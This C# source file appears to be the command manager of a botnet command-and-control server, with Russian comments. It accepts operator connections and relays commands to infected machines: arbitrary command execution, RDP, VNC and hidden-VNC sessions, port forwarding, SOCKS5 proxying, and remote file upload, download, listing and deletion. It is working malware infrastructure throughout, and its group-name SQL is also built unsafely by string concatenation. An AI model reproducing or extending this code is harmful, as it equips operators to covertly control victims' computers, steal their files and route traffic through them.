using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Threading;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Data;

namespace Server
{
	public class CmdManager
	{
		int port;
		ServerBot mainServer;
		Socket sc;

		public const int CmdGetIds = 1;
		public const int CmdSendCmd = 2;
		public const int CmdSetComment = 3;
		public const int CmdGetStreams = 4; //возвращает список потоков запущенных в боте
		public const int CmdJoinStream = 5; //подключиться к указанному потоку
		public const int CmdRDP = 6; //включить рдп
		public const int CmdVNC = 7; //включить внц
		public const int CmdPortForward = 8; //проброс порта
		public const int CmdSocks5 = 9; //включение socks5
		public const int CmdClosePortForward = 10; //закрыть все проброшенные порты
		public const int CmdGetPipeStreams = 11; //получает список пайп каналов нужного типа
		public const int CmdPutPipeData = 12; //отсылает данные пайп каналу
		public const int CmdCreateStream = 13; //создает поток
		public const int CmdCloseStream = 14; //закрывает поток
		public const int CmdSendFile = 15; //отправка файла
		public const int CmdCheckPassword = 16; //проверка пароля доступа к серверу
		public const int CmdGetGroups = 17; //возвращаент список групп
		public const int CmdSetBotGroup = 18; //установка группы для бота
		public const int CmdAddGroup = 19; //добавление группы
		public const int CmdDelGroup = 20; //удаление группы
		public const int CmdUpdateGroup = 21; //обновление имени группы
		public const int CmdHVNC = 22; //включить hvnc
		public const int CmdDir = 23; //получение списка файлов в указанной папке
		public const int CmdGetFile = 24; //запрос файла от бота
		public const int CmdMkDir = 25; //создание папки на стороне бота
		public const int CmdDelFile = 26; //удаление файла или папки на стороне бота
		public const int CmdStopCopy = 27; //остановка копирования файлов
		public const int CmdOff = 28; //отключение или засыпание на указанное время

		public class IdUid
		{
			public int id;
			public string uid;
			public string info;
			public string ip;
			public string comment;
			public string ports;
			public int idGroup;
		}

		public class StreamInfo
		{
			public uint id;
			public int type;
		}

		public class StreamPipeInfo
		{
			public uint id;
			public string namePipe;
		}

		public CmdManager(int port, ServerBot mainServer)
		{
			this.port = port;
			this.mainServer = mainServer;
		}

		public void Start()
		{
			sc = null;
			try
			{
				sc = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				IPEndPoint pnt = new IPEndPoint(IPAddress.Any, port);
				sc.Bind(pnt);
				sc.Listen(200);
			}
			catch (Exception e)
			{
				MessageBox.Show("Произошла ошибка. Сервер для клиентов остановлен. Возможно запущен другой экземпляр сервера с портом " + port.ToString() + "\n" + e.ToString());
				Application.Exit();
			}
			try
			{
				while (true)
				{
					Socket clientSc = sc.Accept();
					if (clientSc.Connected)
					{
						Thread thread = new Thread(ExecuteCmd);
						thread.Start(clientSc);
					}
				}
			}
			catch
			{
			}
		}

		public void Stop()
		{
			sc.Close();
		}

		bool GetBytes(Socket sc, byte[] data, int index, int size)
		{
			bool ret = true;
			List<Socket> ls = new List<Socket>();
			try
			{
				int readed = 0;
				while (readed < size)
				{
					ls.Clear();
					ls.Add(sc);
					Socket.Select(ls, null, null, 5000000); //ждем 5 секунд
					if (ls.Count == 0)
					{
						sc.Close();
						ret = false;
						break;
					}
					int c = sc.Receive(data, index + readed, size - readed, SocketFlags.None);
					if (c > 0)
						readed += c;
					else
					{
						sc.Close();
						ret = false;
						break;
					}
				}
			}
			catch
			{
				sc.Close();
				ret = false;
			}
			return ret;
		}

		bool GetInt32(Socket sc, out int v)
		{
			byte[] data = new byte[4];
			bool ret = GetBytes(sc, data, 0, 4);
			if (ret)
				v = BitConverter.ToInt32(data, 0);
			else
				v = 0;
			return ret;
		}

		bool GetInt16(Socket sc, out short v)
		{
			byte[] data = new byte[2];
			bool ret = GetBytes(sc, data, 0, 2);
			if (ret)
				v = BitConverter.ToInt16(data, 0);
			else
				v = 0;
			return ret;
		}

		bool GetString(Socket sc, out string s)
		{
			s = String.Empty;
			short len;
			if (!GetInt16(sc, out len)) return false;
			byte[] data = new byte[len];
			if (!GetBytes(sc, data, 0, len)) return false;
			s = Encoding.GetEncoding(1251).GetString(data, 0, len);
			return true;
		}

		bool PutBytes(Socket sc, byte[] data, int index, int size)
		{
			bool ret = false;
			try
			{
				int c = sc.Send(data, index, size, SocketFlags.None);
				if (c == size)
					ret = true;
				else
					sc.Close();
			}
			catch
			{
				sc.Close();
			}
			return ret;
		}

		bool PutInt32(Socket sc, int v)
		{
			byte[] data = BitConverter.GetBytes(v);
			return PutBytes(sc, data, 0, 4);
		}

		bool PutInt16(Socket sc, short v)
		{
			byte[] data = BitConverter.GetBytes(v);
			return PutBytes(sc, data, 0, 2);
		}

		bool PutString(Socket sc, string s)
		{
			if (!PutInt16(sc, (short)s.Length)) return false;
			byte[] data = Encoding.GetEncoding(1251).GetBytes(s);
			return PutBytes(sc, data, 0, data.Length);
		}

		bool CheckPassword(Socket sc)
		{
			byte[] pswHash = new byte[16];
			if (!GetBytes(sc, pswHash, 0, 16)) return false;
			return Program.cfg.CheckMD5Password(pswHash);
		}

		void ExecuteCmd(object o_sc)
		{
			Socket sc = (Socket)o_sc;
			byte[] data = new byte[4];
			bool close = true; //закрывать или нет сокет после выполнения команды
			int cmd, id;
			try
			{
				if (CheckPassword(sc) )
				{
					if (GetInt32(sc, out id))
					{
						if (GetInt32(sc, out cmd))
						{
							ClientBot bot = null;
							if (id > 0)
							{
								bot = mainServer.GetClientBot(id);
								if (bot == null) return;
							}
							else
								if (cmd != CmdGetIds && cmd != CmdCheckPassword && cmd != CmdGetGroups && cmd != CmdAddGroup && cmd != CmdDelGroup && cmd != CmdUpdateGroup)
									return;
							switch (cmd)
							{
								case CmdGetIds:
									GetIds(sc);
									break;
								case CmdCheckPassword:
									CheckPasswordCmd(sc);
									break;
								case CmdGetGroups:
									GetGroups(sc);
									break;
								case CmdAddGroup:
									AddGroup(sc);
									break;
								case CmdDelGroup:
									DelGroup(sc);
									break;
								case CmdUpdateGroup:
									UpdateGroup(sc);
									break;

								case CmdSendCmd:
									SendCmd(sc, bot);
									break;
								case CmdSetComment:
									SetComment(sc, bot);
									break;
								case CmdGetStreams:
									GetStreams(sc, bot);
									break;
								case CmdJoinStream:
									close = !JoinStream(sc, bot);
									break;
								case CmdRDP:
									StartRDP(sc, bot);
									break;
								case CmdVNC:
									StartVNC(sc, bot);
									break;
								case CmdHVNC:
									StartHVNC(sc, bot);
									break;
								case CmdPortForward:
									StartPortForward(sc, bot);
									break;
								case CmdClosePortForward:
									ClosePortForward(sc, bot);
									break;
								case CmdSocks5:
									StartSocks5(sc, bot);
									break;
								case CmdGetPipeStreams:
									GetPipeStreams(sc, bot);
									break;
								case CmdPutPipeData:
									PutPipeData(sc, bot);
									break;
								case CmdCreateStream:
									close = !CreateStream(sc, bot);
									break;
								case CmdCloseStream:
									CloseStream(sc, bot);
									break;
								case CmdSendFile:
									SendFile(sc, bot);
									break;
								case CmdDir:
									Dir(sc, bot);
									break;
								case CmdGetFile:
									GetFile(sc, bot);
									break;
								case CmdMkDir:
									CreateFolder(sc, bot);
									break;
								case CmdDelFile:
									DelFile(sc, bot);
									break;
								case CmdStopCopy:
									StopCopy(sc, bot);
									break;
								case CmdSetBotGroup:
									SetBotGroup(sc, bot);
									break;
								case CmdOff:
									OffBot(sc, bot);
									break;
							}
						}
					}
				}
				if (sc.Connected && close) sc.Close();
			}
			catch
			{
			}
		}

		void GetIds(Socket sc)
		{
			IdUid[] ids = mainServer.CM_GetIds();
			if (ids == null)
			{
				PutInt32(sc, 0);
			}
			else
			{
				PutInt32(sc, ids.Length);
				for (int i = 0; i < ids.Length; i++)
				{
					PutInt32(sc, ids[i].id);
					PutString(sc, ids[i].uid);
					PutString(sc, ids[i].info);
					PutString(sc, ids[i].ip);
					PutString(sc, ids[i].comment);
					PutString(sc, ids[i].ports);
					PutInt32(sc, ids[i].idGroup);
				}
			}
		}

		void CheckPasswordCmd(Socket sc)
		{
			PutInt32(sc, 1);
		}

		void GetGroups(Socket sc)
		{
			DataTable tbl =	Program.server.MDB.GetTable("SELECT * FROM [groups] ORDER BY Id");
			PutInt32(sc, tbl.Rows.Count);
			foreach (DataRow row in tbl.Rows)
			{
				PutInt32(sc, DB.Nz.GetInt(row["Id"]));
				PutString(sc, DB.Nz.GetString(row["Name"]));
			}
		}

		void AddGroup(Socket sc)
		{
			string s;
			if (GetString(sc, out s))
			{
				int id = 0;
				if (s.Length > 0)
				{
					string sql = "INSERT INTO [groups] ([Name]) VALUES ('" + s + "')";
					Program.server.MDB.SendSQL(sql);
					sql = "SELECT Max([Id]) FROM [groups]";
					id = Program.server.MDB.GetInt(sql);
				}
				PutInt32(sc, id);
			}
		}

		void DelGroup(Socket sc)
		{
			int id;
			if (GetInt32(sc, out id))
			{
				string sql = "DELETE FROM [groups] WHERE [Id]=" + id.ToString();
				Program.server.MDB.SendSQL(sql);
			}
		}

		void UpdateGroup(Socket sc)
		{
			int id;
			if (GetInt32(sc, out id))
			{
				string s;
				if (GetString(sc, out s))
				{
					string sql = "UPDATE [groups] SET [Name]='" + s + "' WHERE [Id]=" + id.ToString();
					Program.server.MDB.SendSQL(sql);
				}
			}
		}

		void SendCmd(Socket sc, ClientBot bot)
		{
			string s;
			if (!GetString(sc, out s)) return;
			bot.SendCmdString(Sender.ID_CMD_BOT, s);
		}

		void SetComment(Socket sc, ClientBot bot)
		{
			string s;
			if (!GetString(sc, out s)) return;
			bot.Comment = s;
		}

		void GetStreams(Socket sc, ClientBot bot)
		{
			StreamInfo[] streams = bot.CM_GetStreams();
			PutInt16(sc, (short)streams.Length);
			for (int i = 0; i < streams.Length; i++)
			{
				if (!PutInt16(sc, (short)streams[i].type)) break;
				if (!PutInt32(sc, (int)streams[i].id)) break;
			}
		}

		bool JoinStream(Socket sc, ClientBot bot)
		{
			int idStream;
			if (!GetInt32(sc, out idStream)) return false;
			StreamSocket ss = new StreamSocket(sc);
			return bot.AddStreamReceiver((uint)idStream, ss);
		}

		bool CreateStream(Socket sc, ClientBot bot)
		{
			StreamProxy stream = bot.CM_CreateStream();
			uint idStream = 0;
			if (stream != null)
			{
				stream.AddReceiver(new StreamSocket(sc));
				idStream = stream.id;
			}
			return PutInt32(sc, (int)idStream);
		}

		bool CloseStream(Socket sc, ClientBot bot)
		{
			int idStream;
			if (!GetInt32(sc, out idStream)) return false;
			bot.CM_CloseStream((uint)idStream);
			return true;
		}

		void StartRDP(Socket sc, ClientBot bot)
		{
			bot.CreateService(Sender.ID_RDP, null, "RDP", Encoding.ASCII.GetBytes("127.0.0.1:3389"));
		}

		void StartVNC(Socket sc, ClientBot bot)
		{
			short port;
			if (!GetInt16(sc, out port)) return;
			if (port > 0)
			{
				bot.CreateService(Sender.ID_VNC, BitConverter.GetBytes(port), "VNC:" + port.ToString(), Encoding.ASCII.GetBytes("127.0.0.1:" + port.ToString()));
			}
			else
			{
				bot.CreateService(Sender.ID_VNC, BitConverter.GetBytes(port), "VNC", null);
			}
		}

		void StartHVNC(Socket sc, ClientBot bot)
		{
			short port;
			if (!GetInt16(sc, out port)) return;
			if (port > 0)
			{
				bot.CreateService(Sender.ID_HVNC, BitConverter.GetBytes(port), "HVNC:" + port.ToString(), Encoding.ASCII.GetBytes("127.0.0.1:" + port.ToString()));
			}
			else
			{
				bot.CreateService(Sender.ID_HVNC, BitConverter.GetBytes(port), "HVNC", null);
			}
		}

		void StartPortForward(Socket sc, ClientBot bot)
		{
			string port;
			if (!GetString(sc, out port)) return;
			bot.CreateTunnelOne(Sender.ID_PORTFORWARD, port, Sender.ID_PORTFORWARD_ON_OFF, Encoding.ASCII.GetBytes(port));
		}

		void ClosePortForward(Socket sc, ClientBot bot)
		{
			bot.CloseTunnelsOne();
			bot.CloseSocketTunnels();
		}

		void StartSocks5(Socket sc, ClientBot bot)
		{
			bot.CreateTunnelOne(Sender.ID_SOCKS, string.Empty, Sender.ID_SOCKS_ON_OFF, null);
		}

		void GetPipeStreams(Socket sc, ClientBot bot)
		{
			string nameId;
			if (!GetString(sc, out nameId))
			{
				PutInt16(sc, 0);
			}
			else
			{
				StreamPipeInfo[] streams = bot.CM_GetPipeStreams(nameId);
				PutInt16(sc, (short)streams.Length);
				for (int i = 0; i < streams.Length; i++)
				{
					if (!PutInt32(sc, (int)streams[i].id)) break;
					if (!PutString(sc, streams[i].namePipe)) break;
				}
			}
		}

		void PutPipeData(Socket sc, ClientBot bot)
		{
			string namePipe;
			if (GetString(sc, out namePipe))
			{
				int count;
				if( GetInt32(sc, out count) )
				{
					byte[] data = new byte[count];
					if (GetBytes(sc, data, 0, count))
					{
						bot.CM_PutPipeData(namePipe, data, count);
					}
				}
			}
		}

		void SendFile(Socket sc, ClientBot bot)
		{
			int idStream;
			if (GetInt32(sc, out idStream))
			{
				string fileName;
				if (GetString(sc, out fileName))
				{
					int sizeFile;
					if (GetInt32(sc, out sizeFile))
					{
						short num;
						if (GetInt16(sc, out num))
						{
							short state;
							if (GetInt16(sc, out state))
							{
								short c_data;
								if (GetInt16(sc, out c_data))
								{
									byte[] data = new byte[c_data];
									if (GetBytes(sc, data, 0, c_data))
									{
										bot.CM_SendFile(idStream, fileName, sizeFile, num, state, c_data, data);
										PutInt16(sc, 1); //оповещаем что данные отправлены
									}
								}
							}
						}
					}
				}
			}
		}

		void GetFile(Socket sc, ClientBot bot)
		{
			int idStream;
			if (GetInt32(sc, out idStream))
			{
				string fileName;
				if (GetString(sc, out fileName))
				{
					bot.CM_GetFile(idStream, fileName);
				}
			}
		}

		void StopCopy(Socket sc, ClientBot bot)
		{
			bot.CM_StopCopy();
		}

		void SetBotGroup(Socket sc, ClientBot bot)
		{
			int id;
			if (GetInt32(sc, out id))
			{
				bot.IdGroup = id;
			}
		}

		void Dir(Socket sc, ClientBot bot)
		{
			int idStream;
			if (GetInt32(sc, out idStream))
			{
				string path;
				if (GetString(sc, out path))
				{
					bot.CM_Dir(idStream, path);
				}
			}
		}

		void DelFile(Socket sc, ClientBot bot)
		{
			int idStream;
			if (GetInt32(sc, out idStream))
			{
				string path;
				if (GetString(sc, out path))
				{
					bot.CM_DelFile(idStream, path);
				}
			}
		}

		void CreateFolder(Socket sc, ClientBot bot)
		{
			int idStream;
			if (GetInt32(sc, out idStream))
			{
				string path;
				if (GetString(sc, out path))
				{
					bot.CM_CreateFolder(idStream, path);
				}
			}
		}

		void OffBot(Socket sc, ClientBot bot)
		{
			int param, time;
			if( GetInt32(sc, out param ) )
				if (GetInt32(sc, out time))
				{
					bot.OffBot(param, time);
				}
		}
	}
}
